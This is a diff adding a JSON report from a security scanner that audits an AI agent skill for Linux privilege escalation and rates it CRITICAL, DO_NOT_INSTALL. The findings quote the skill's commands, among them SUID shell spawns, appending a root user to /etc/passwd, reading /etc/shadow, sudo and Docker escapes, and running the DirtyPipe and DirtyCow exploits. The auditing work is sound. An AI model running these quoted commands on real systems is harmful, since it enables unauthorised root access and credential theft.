@@ -1,0 +1,4063 @@
+{
+  "multi_skill": true,
+  "skill_count": 2,
+  "max_risk_score": 100,
+  "risk_severity": "CRITICAL",
+  "execution_successful": true,
+  "risk_recommendation": "DO_NOT_INSTALL",
+  "analysis_completeness": {
+    "is_complete": false,
+    "execution_successful": true,
+    "status": "partial",
+    "coverage_percent": 50.0,
+    "fully_inspected_files": 1,
+    "partially_inspected_files": 1,
+    "entirely_uninspected_files": 0,
+    "total_files": 2,
+    "limitations": [],
+    "scope": "recursive_skills"
+  },
+  "skills_scanned": 2,
+  "skills_omitted": 0,
+  "skills_output_omitted": 0,
+  "public_finding_records": 83,
+  "report_characters": 158569,
+  "transitive_finding_count": 0,
+  "transitive_sources": [],
+  "skills": [
+    {
+      "name": "offensive-linux-privesc",
+      "path": "offensive-linux-privesc",
+      "risk_score": 100,
+      "risk_severity": "CRITICAL",
+      "finding_count": 22,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-linux-privesc",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/privesc/offensive-linux-privesc",
+        "scanned_at": "2026-11-13T11:41:53.490004+00:00"
+      },
+      "risk_assessment": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "recommendation": "DO_NOT_INSTALL",
+        "max_issue_severity": "HIGH"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 584,
+          "executable": false,
+          "size_bytes": 19032,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "PE3",
+          "finding_id": "finding-5ebab024c6e945a199ccd2e401ce1281",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": null,
+            "start_column": 495
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "vesc\ndescription: \"Comprehensive Linux privilege escalation methodology for offensive security engagements. Covers the full attack surface from a low-privilege shell to root: SUID/SGID binary abuse via GTFOBins, Linux capabilities exploitation (cap_setuid, cap_dac_override, cap_dac_read_search), sudo misconfigurations including NOPASSWD rules and Baron Samedit (CVE-2021-3156), cron job abuse through writable scripts, PATH hijacking, and wildcard injection with tar/rsync/chown. Includes writable /etc/passwd attacks, NFS no_root_squash exploitation, kernel exploits (DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195, PwnKit CVE-2021-4034), Docker group container escapes, LD_PRELOAD and LD_LIBRARY_PATH hijacking for shared library injection, systemd service misconfigurations, and sensitive file enumeration for credential harvesting. Integrates automated enumeration with LinPEAS, linux-exploit-suggester, pspy for process monitoring, and GTFOBins for binary exploitation. Each technique include",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 3,
+              "end_line": null,
+              "start_column": 495
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-3cef78fcc6a74d3c8cf26aedff30933b",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 17,
+            "end_line": null,
+            "start_column": 31
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "1. Run automated enumeration (LinPEAS, linux-exploit-suggester) to surface quick wins.\n2. Check sudo permissions, SUID/SGID binaries, and capabilities first -- these are the highest-probability vectors.\n3. Enumerate cron jobs, writable scripts, and PATH ordering for hijack opportunities.\n4. Inspect file permissions on /etc/passwd, /etc/shadow, service configs, and SSH keys.\n5. Check for NFS shares with no_root_squash and Docker group membership.\n6. Fingerprint the kernel version and search for applicable kernel exploits as a last resort.\n7. Validate the escalation path, document the chain, and clean up artifacts.",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 17,
+              "end_line": null,
+              "start_column": 31
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-b2158bee86ce449db06613a34ffe2e4c",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 71,
+            "end_line": null,
+            "start_column": 29
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "# If python3 is SUID\npython3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n\n# If cp is SUID -- overwrite /etc/passwd\ncp /etc/passwd /dev/shm/passwd.bak\necho 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /dev/shm/passwd_modified\ncp /dev/shm/passwd_modified /etc/passwd",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 71,
+              "end_line": null,
+              "start_column": 29
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-70a2ec0211974e50b52ab89992864404",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 72,
+            "end_line": null,
+            "start_column": 3
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n\n# If cp is SUID -- overwrite /etc/passwd\ncp /etc/passwd /dev/shm/passwd.bak\necho 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /dev/shm/passwd_modified\ncp /dev/shm/passwd_modified /etc/passwd\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 72,
+              "end_line": null,
+              "start_column": 3
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-cfa1cbc1e0b247149c530a7693f1cffe",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 74,
+            "end_line": null,
+            "start_column": 28
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "# If cp is SUID -- overwrite /etc/passwd\ncp /etc/passwd /dev/shm/passwd.bak\necho 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /dev/shm/passwd_modified\ncp /dev/shm/passwd_modified /etc/passwd\n\n# If bash is SUID\nbash -p",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 74,
+              "end_line": null,
+              "start_column": 28
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-cf1dbbf9d1f240039e008c34c1b48e89",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 256,
+            "end_line": null,
+            "start_column": 12
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "\n---\n\n## Writable /etc/passwd\n\nIf /etc/passwd is world-writable (a severe misconfiguration), you can add a root-equivalent user directly.\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 256,
+              "end_line": null,
+              "start_column": 12
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-9cb9a5ddc51d4648be60aa5e0ecc597d",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 258,
+            "end_line": null,
+            "start_column": 3
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "\n## Writable /etc/passwd\n\nIf /etc/passwd is world-writable (a severe misconfiguration), you can add a root-equivalent user directly.\n\n```bash\n# Check permissions",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 258,
+              "end_line": null,
+              "start_column": 3
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-9c23ea9be2d34f259b35ff5b7e2f1b45",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 262,
+            "end_line": null,
+            "start_column": 7
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "\n```bash\n# Check permissions\nls -la /etc/passwd\n\n# Generate password hash\nopenssl passwd -1 -salt hacker password123",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 262,
+              "end_line": null,
+              "start_column": 7
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-f1fb656f09df482b822d37e576cad9af",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 269,
+            "end_line": null,
+            "start_column": 71
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "# Output: $1$hacker$6luIRwdGpBvXdP.GMwcZp/\n\n# Append a new root user\necho 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash' >> /etc/passwd\n\n# Or replace root's password hash (more detectable)\n# Switch to the new user",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 269,
+              "end_line": null,
+              "start_column": 71
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-88b455295eaa4fae9a3f6cbccf83af75",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 329,
+            "end_line": null,
+            "start_column": 12
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "\n# Compile the exploit\ngcc -o dirtypipe exploit.c\n./dirtypipe /etc/passwd 1 \"${replacement_line}\"\n\n# Or use the SUID variant\ngcc -o dirtypipez dirtypipez.c",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 329,
+              "end_line": null,
+              "start_column": 12
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-7757c05a44254b0d96c21dbe85294ec3",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 343,
+            "end_line": null,
+            "start_column": 6
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "# Affects Linux kernel 2.x through 4.x before 4.8.3\n# Race condition in copy-on-write mechanism\n\n# The /etc/passwd overwrite variant\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty password123\n# Overwrites root entry in /etc/passwd",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 343,
+              "end_line": null,
+              "start_column": 6
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-a40db47e89544c8bbaa48c9e9541f202",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 346,
+            "end_line": null,
+            "start_column": 27
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "# The /etc/passwd overwrite variant\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty password123\n# Overwrites root entry in /etc/passwd\n\n# The SUID binary variant (firefart)\ngcc -pthread cowroot.c -o cowroot",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 346,
+              "end_line": null,
+              "start_column": 27
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-405839597dd644839ffb4a752e1b4855",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 512,
+            "end_line": null,
+            "start_column": 2
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "| Sudo exploitation | Auth logs showing sudo usage for unusual commands, sudoers file modification timestamps |\n| CVE-2021-3156 | sudoedit crash logs, coredumps, heap corruption signatures in audit logs |\n| Cron hijacking | Modified cron scripts (integrity monitoring), new files with tar flag names |\n| /etc/passwd writes | File integrity monitoring alerts, new UID 0 entries, inotify watches |\n| NFS SUID creation | New SUID files appearing on NFS mounts, NFS audit logs on the server |\n| Kernel exploits | Kernel oops/panic messages, unexpected root process spawning, crash dumps |\n| Docker escape | Docker API calls, container creation with host mounts, docker.sock access |",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 512,
+              "end_line": null,
+              "start_column": 2
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-efee4a0fe2414d8e9ac609ab96bf1205",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 540,
+            "end_line": null,
+            "start_column": 9
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "  find / -perm -4000 -type f 2>/dev/null     # SUID binaries\n  getcap -r / 2>/dev/null                    # Capabilities\n  cat /etc/crontab && ls -la /etc/cron.*     # Cron jobs\n  ls -la /etc/passwd /etc/shadow             # File permissions\n  cat /etc/exports 2>/dev/null               # NFS shares\n  uname -a && cat /etc/os-release            # Kernel version\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 540,
+              "end_line": null,
+              "start_column": 9
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-7126f9191fc442749d3e215fe5351482",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 555,
+            "end_line": null,
+            "start_column": 2
+          },
+          "finding": "/etc/passwd",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "  PATH hijack in cron or SUID binary\n  LD_PRELOAD via sudo env_keep\n  Docker mount host filesystem\n  /etc/passwd append (if writable)\n\nPHASE 4 -- KERNEL (last resort)\n  linux-exploit-suggester.sh",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ac75eea6ed115d0252fb13bbb10e9c4421764d5a7612787edcde6a78569d8f88",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 555,
+              "end_line": null,
+              "start_column": 2
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-77d957d07eba46d9a9ebd85ea4c5dfa1",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'privilege_escalation_tools': Privilege escalation tools and techniques [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": null
+          },
+          "finding": "LinPEAS; LinPEAS; LinPEAS; linpeas; linpeas; linpeas; linpeas; LinPEAS; LinPEAS; LinPEAS; LinPEAS; pspy; pspy; pspy; pspy; pspy; pspy; pspy; pspy; linux-exploit-suggester; linux-exploit-suggester; lin",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": "ot: SUID/SGID binary abuse via GTFOBins, Linux capabilities exploitation (cap_setuid, cap_dac_override, cap_dac_read_search), sudo misconfigurations including NOPASSWD rules and Baron Samedit (CVE-2021-3156), cron job abuse through writable scripts, PATH hijacking, and wildcard injection with tar/rsync/chown. Includes writable /etc/passwd attacks, NFS no_root_squash exploitation, kernel exploits (DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195, PwnKit CVE-2021-4034), Docker group container escapes, LD_PRELOAD and LD_LIBRARY_PATH hijacking for shared library injection, systemd service misconfigurations, and sensitive file enumeration for credential harvesting. Integrates automated enumeration with LinPEAS, linux-exploit-suggester, pspy for process monitoring, and GTFOBins for binary exploitation. Each technique includes detection signatures and defender-side visibility to support purple team operations. Maps to MITRE ATT&CK T1548 (Abuse Elevation Control Mechanism) and related sub-techn",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "18a9a097b13608cac432f8c9e211510a2099dd083fb3a65f288512aa0215e798",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 3,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-e2db41de6f3b4a0082cc1bf0530bac8b",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 17,
+            "end_line": null,
+            "start_column": 44
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "1. Run automated enumeration (LinPEAS, linux-exploit-suggester) to surface quick wins.\n2. Check sudo permissions, SUID/SGID binaries, and capabilities first -- these are the highest-probability vectors.\n3. Enumerate cron jobs, writable scripts, and PATH ordering for hijack opportunities.\n4. Inspect file permissions on /etc/passwd, /etc/shadow, service configs, and SSH keys.\n5. Check for NFS shares with no_root_squash and Docker group membership.\n6. Fingerprint the kernel version and search for applicable kernel exploits as a last resort.\n7. Validate the escalation path, document the chain, and clean up artifacts.",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 17,
+              "end_line": null,
+              "start_column": 44
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-5e0d0926d0ba4e078826bc0c12869e3f",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 119,
+            "end_line": null,
+            "start_column": 4
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'\n\n# cap_dac_override on vim (read/write any file)\nvim /etc/shadow\n\n# cap_dac_read_search on tar (read any file)\ntar czf /dev/shm/shadow.tar.gz /etc/shadow",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 119,
+              "end_line": null,
+              "start_column": 4
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-62b1f267e928453988c5aee1a5aa899f",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 122,
+            "end_line": null,
+            "start_column": 31
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "vim /etc/shadow\n\n# cap_dac_read_search on tar (read any file)\ntar czf /dev/shm/shadow.tar.gz /etc/shadow\ntar xzf /dev/shm/shadow.tar.gz -C /dev/shm/\n\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 122,
+              "end_line": null,
+              "start_column": 31
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-67c8f3a761634608b5a9eccb70d9c6fa",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 149,
+            "end_line": null,
+            "start_column": 10
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "sudo vim -c '!bash'\n\n# If sudo allows less NOPASSWD\nsudo less /etc/shadow\n!/bin/bash\n\n# If sudo allows awk NOPASSWD",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 149,
+              "end_line": null,
+              "start_column": 10
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-566a246600d94d09a6e6a9c8af33d4a9",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 387,
+            "end_line": null,
+            "start_column": 11
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
+          "remediation": "Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.",
+          "code_snippet": "docker run -v /:/hostfs -it ubuntu /bin/bash\n\n# Inside the container, access host filesystem\ncat /hostfs/etc/shadow\nchroot /hostfs /bin/bash\n\n# Create a SUID bash on the host",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "06c524361d95c8a32e6880ce59718fdcbbd71f769747a5803817ef7fa3e0cb06",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 387,
+              "end_line": null,
+              "start_column": 11
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE3",
+          "finding_id": "finding-6e2e304eba214750b3d0096006ffcf99",
+          "category": "Privilege Escalation",
+          "pattern": "Credential Access",
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 494,
+            "end_line": null,
+            "start_column": 4
+          },
+          "finding": "/etc/shadow",
+          "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.",
